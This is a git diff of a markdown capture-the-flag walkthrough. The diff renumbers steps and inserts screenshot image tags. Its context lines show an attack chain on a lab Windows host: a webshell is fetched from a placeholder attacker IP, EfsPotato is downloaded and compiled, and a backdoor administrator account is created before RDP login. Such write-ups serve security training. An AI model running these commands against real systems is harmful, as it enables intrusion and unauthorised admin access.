@@ -106,7 +106,7 @@ rm log.txt
 
 8. Reload the URL again. Now the page should return the first user flag.
 
-[SCREEN01]
+<img width="846" height="151" alt="SCREEN01" src="https://github.com/user-attachments/assets/ca772158-870f-45b1-95da-a43084183156" />
 
 ### What is the content of the root level flag?
 
@@ -162,14 +162,14 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 python3 -m http.server
 ```
 
-6. From the target machine, place the shell into the web root:
+5. From the target machine, place the shell into the web root:
 
 ```bash
 cd C:\xampp\htdocs
 iwr -uri "http://<ATTACKER_IP>:8000/shell.php" -o shell.php
 ```
 
-7. Access the webshell via the web server: `http://<TARGET_IP>:8080/shell.php`, then verify privileges again:
+6. Access the webshell via the web server: `http://<TARGET_IP>:8080/shell.php`, then verify privileges again:
 
 ```bash
 whoami /priv
@@ -186,25 +186,25 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
-8. Download [EfsPotato](https://github.com/zcgonvh/EfsPotato) on the target from your host:
+7. Download [EfsPotato](https://github.com/zcgonvh/EfsPotato) on the target from your host:
 
 ```bash
 curl http://<ATTACKER_IP>:8000/EfsPotato.cs -o C:\xampp\htdocs\efs.cs
 ```
 
-9. Run `EfsPotato` to spawn an elevated command session and create a new admin user:
+8. Run `EfsPotato` to spawn an elevated command session and create a new admin user:
 
 ```bash
 C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe efs.cs -nowarn:1691,618
 .\efs.exe "cmd.exe /c net user user password@123 /add && net localgroup administrators user /add"
 ```
 
-10. Connect to the box via RDP using the new administrator account:
+9. Connect to the box via RDP using the new administrator account:
 
 ```bash
 xfreerdp /v:<TARGET_IP> /u:user /p:'password@123' /cert:ignore
 ```
 
-11. On the Administrator desktop, read the root flag:
+10. On the Administrator desktop, read the root flag:
 
-[SCREEN02]
+<img width="1030" height="797" alt="SCREEN02" src="https://github.com/user-attachments/assets/73bb1d3c-04ac-42a1-b97b-6a07fc989231" />
